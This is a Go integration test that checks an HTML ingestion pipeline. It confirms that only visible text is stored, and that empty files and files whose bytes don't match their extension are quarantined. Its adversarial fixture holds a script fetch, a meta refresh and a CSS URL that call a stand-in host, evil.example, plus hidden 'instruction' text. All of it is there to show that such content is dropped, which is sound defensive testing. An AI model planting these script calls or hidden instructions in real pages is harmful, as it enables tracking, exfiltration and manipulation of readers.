package postgres_test

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/jackc/pgx/v5/pgxpool"
	"knowvault.local/verified-workspace/internal/ingestion"
	"knowvault.local/verified-workspace/internal/jobs"
	"knowvault.local/verified-workspace/internal/source/canon"
	sourcehtml "knowvault.local/verified-workspace/internal/source/html"
	"knowvault.local/verified-workspace/internal/source/ids"
)

// htmlAnchorFragment is one stored Evidence fragment with the columns needed to
// prove a TEXT line-range anchor re-resolves.
type htmlAnchorFragment struct {
	ordinal    int
	textHash   string
	anchorHash string
}

func htmlFragments(t *testing.T, ctx context.Context, admin *pgxpool.Pool, extractionID string) []htmlAnchorFragment {
	t.Helper()
	rows, err := admin.Query(ctx, `SELECT ordinal, text_hash, anchor_hash FROM public.evidence_fragment
		WHERE organization_id=$1 AND extraction_id=$2 ORDER BY ordinal`, s1dOrg, extractionID)
	if err != nil {
		t.Fatal(err)
	}
	defer rows.Close()
	var out []htmlAnchorFragment
	for rows.Next() {
		var f htmlAnchorFragment
		if err := rows.Scan(&f.ordinal, &f.textHash, &f.anchorHash); err != nil {
			t.Fatal(err)
		}
		out = append(out, f)
	}
	return out
}

// TestS2aHTMLFolderExtraction proves the P2/I2 safe folder-HTML slice — the S2a
// text/structured straggler delivered once the golang.org/x/net dependency gate
// closed (ADR-0060 §7, PARSER_CONTRACTS.md §1/§5); it is distinct from S2b, which
// the plan reserves for office (DOCX/PPTX/XLSX). A connected `.html` file becomes
// TEXT line-range Evidence carrying the html-v1 profile whose anchor re-resolves to
// the exact normalized visible text; active/embedded/hidden/browser-fallback content
// and external URLs are dropped and never reach durable storage; and a text-free
// document or a media-signature mismatch is quarantined with no fallback.
func TestS2aHTMLFolderExtraction(t *testing.T) {
	ctx := context.Background()
	admin := resetStage1Database(t)
	codec := s1dCodec(t, s1dOrg)
	root := t.TempDir()
	dir := filepath.Join(root, "projects", "alpha")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}

	// An adversarial document: visible prose interleaved with a script, style,
	// hidden subtree, external-URL link, form control and meta refresh. Every
	// non-visible carrier holds the unique token SUPPRESSEDCANARY, which must never
	// appear in the extracted text or in any durable ciphertext. The visible text
	// (which IS stored, encrypted) deliberately avoids that token.
	goodHTML := `<!DOCTYPE html><html><head>` +
		`<title>SUPPRESSEDCANARY title</title>` +
		`<meta http-equiv="refresh" content="0;url=http://evil.example/SUPPRESSEDCANARY">` +
		`<style>.a{background:url('http://evil.example/SUPPRESSEDCANARY')}</style>` +
		`<script>var x="SUPPRESSEDCANARY";fetch("http://evil.example/SUPPRESSEDCANARY")</script>` +
		`</head><body>` +
		`<h1>Quarterly Report</h1>` +
		`<p>Revenue grew by <b>12 percent</b> this period.</p>` +
		`<div hidden><p>SUPPRESSEDCANARY hidden instruction</p></div>` +
		`<noscript>SUPPRESSEDCANARY noscript</noscript>` +
		`<noframes>SUPPRESSEDCANARY noframes instruction</noframes>` +
		`<noembed>SUPPRESSEDCANARY noembed instruction</noembed>` +
		`<dialog>SUPPRESSEDCANARY dialog secret</dialog>` +
		`<p>See <a href="http://evil.example/SUPPRESSEDCANARY">the appendix</a> for details.</p>` +
		`<form><label>User</label><input value="SUPPRESSEDCANARY"><button>Send</button></form>` +
		`<ul><li>First item</li><li>Second item</li></ul>` +
		`</body></html>`
	writeS1dFile(t, filepath.Join(dir, "report.html"), goodHTML)

	// Quarantined: a document with only active content and no visible text — no
	// Evidence, no fallback to raw markup.
	writeS1dFile(t, filepath.Join(dir, "empty.html"),
		`<html><head><style>.a{}</style></head><body><script>x=1</script></body></html>`)

	// Quarantined: a media-signature mismatch — the bytes are a PNG, the extension
	// says HTML. The connector gates on the signature, not the extension.
	writeS1dFile(t, filepath.Join(dir, "fake.html"),
		"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR fake image bytes not html")

	seedS1dOrg(t, ctx, admin, s1dOrg, s1dOwner)
	configHash := seedS1dScope(t, ctx, admin, codec, s1dOrg, s1dOwner)
	// The claim-time liveness re-check (000018 s5) needs a live confirmation.
	seedS1dScopeAuthority(t, ctx, admin, s1dOrg, s1dWorkspace, s1dOwner, s1dViewer,
		s1dScopeID, configHash, 1, "binding_01ARZ3NDEKTSV4RRFFQ69G5FAV", "grant_s1d_admin", "confirmation_s1d_admin")
	workerStore := openStore(t, ctx, workerRole, "knowvault_worker")
	queue, _ := jobs.New(workerStore)
	handler := ingestion.NewHandler(workerStore, queue, mustRepo(t), codec,
		ingestion.Digester{Key: s1dDigestKey, KeyVersion: 1}, s1dMounts{root: root}, s1dWorkerID, time.Now, ids.New)
	runSync(t, ctx, handler, queue, workerAccess(t, s1dOrg), "html-sync")

	// The good document ingested with the html-v1 profile; the two bad ones are
	// quarantined (no object, no fallback).
	if got := s2aActiveRevision(t, ctx, admin, "projects/alpha/report.html"); got != "html-v1-layout-v2" {
		t.Fatalf("report.html parser_profile_revision = %q, want html-v1-layout-v2", got)
	}
	for _, path := range []string{"projects/alpha/empty.html", "projects/alpha/fake.html"} {
		if got := s2aActiveRevision(t, ctx, admin, path); got != "" {
			t.Fatalf("%s should have been quarantined, got extraction %q", path, got)
		}
	}
	if c := s1dCounts(t, ctx, admin); c.objects != 1 {
		t.Fatalf("objects=%d, want 1 (report.html)", c.objects)
	}

	objectID, _, extractionID := s1dTargetEvidence(t, ctx, admin, "projects/alpha/report.html")
	_ = objectID

	// The HTML extraction resolves to the TEXT canonical format (line-range anchor),
	// text-v1 normalization, exactly as PARSER_CONTRACTS.md §1 assigns.
	var canonicalFormat, normalization string
	if err := admin.QueryRow(ctx, `SELECT canonical_format, normalization_version
		FROM public.source_extraction WHERE organization_id=$1 AND id=$2`, s1dOrg, extractionID).
		Scan(&canonicalFormat, &normalization); err != nil {
		t.Fatal(err)
	}
	if canonicalFormat != "TEXT" || normalization != "text-v1" {
		t.Fatalf("canonical_format/normalization = %s/%s, want TEXT/text-v1", canonicalFormat, normalization)
	}

	// The canonical visible text is exactly the normalized block structure — no
	// active content, no URL, no hidden/form text.
	canonical, err := sourcehtml.Extract([]byte(goodHTML))
	if err != nil {
		t.Fatalf("re-extract: %v", err)
	}
	wantText := "Quarterly Report\nRevenue grew by 12 percent this period.\n" +
		"See the appendix for details.\nFirst item\nSecond item\n"
	if string(canonical) != wantText {
		t.Fatalf("canonical visible text = %q, want %q", canonical, wantText)
	}
	if strings.Contains(string(canonical), "SUPPRESSEDCANARY") || strings.Contains(string(canonical), "evil.example") {
		t.Fatal("active/hidden/external content leaked into canonical text")
	}

	// Anchor replay: re-derive the TEXT line-range fragments exactly as the pipeline
	// does and prove every stored fragment's text and anchor re-resolve.
	type expected struct{ textHash, anchorHash string }
	var want []expected
	for _, seg := range canon.Segment(canonical, s1dMaxFragmentBytes) {
		slice, ok := canon.Slice(canonical, seg.LineStart, seg.LineEnd)
		if !ok {
			t.Fatalf("segment %d does not slice", seg.Ordinal)
		}
		anchorBytes, err := canon.TextAnchorBytes(seg.LineStart, seg.LineEnd)
		if err != nil {
			t.Fatal(err)
		}
		want = append(want, expected{textHash: canon.HMACDigest(s1dDigestKey, 1, slice), anchorHash: canon.HMACDigest(s1dDigestKey, 1, anchorBytes)})
	}
	got := htmlFragments(t, ctx, admin, extractionID)
	if len(got) != len(want) || len(got) == 0 {
		t.Fatalf("fragment count %d != expected %d", len(got), len(want))
	}
	for i := range want {
		if got[i].textHash != want[i].textHash {
			t.Fatalf("fragment %d text_hash mismatch: TEXT anchor does not re-resolve", i+1)
		}
		if got[i].anchorHash != want[i].anchorHash {
			t.Fatalf("fragment %d anchor_hash mismatch: TEXT anchor not reproducible", i+1)
		}
	}

	// Canary durable-sink scan: no dropped/active/external content reaches any
	// ciphertext column. Only the normalized visible text is ever stored.
	t.Run("no suppressed content in durable storage", func(t *testing.T) {
		var leaks int
		if err := admin.QueryRow(ctx, `SELECT count(*) FROM public.encrypted_artifact
			WHERE organization_id=$1 AND (
				position('SUPPRESSEDCANARY' in encode(ciphertext,'escape')) > 0 OR
				position('evil.example' in encode(ciphertext,'escape')) > 0)`, s1dOrg).Scan(&leaks); err != nil {
			t.Fatal(err)
		}
		if leaks != 0 {
			t.Fatal("suppressed/active/external HTML content found in ciphertext")
		}
	})

	// Re-running the sync is deterministic: the same immutable Evidence, no duplicate
	// object/version/extraction/fragment.
	t.Run("repeat sync is deterministic", func(t *testing.T) {
		before := s1dCounts(t, ctx, admin)
		runSync(t, ctx, handler, queue, workerAccess(t, s1dOrg), "html-resync")
		after := s1dCounts(t, ctx, admin)
		if before != after {
			t.Fatalf("re-sync changed catalog counts: %+v -> %+v", before, after)
		}
	})
}
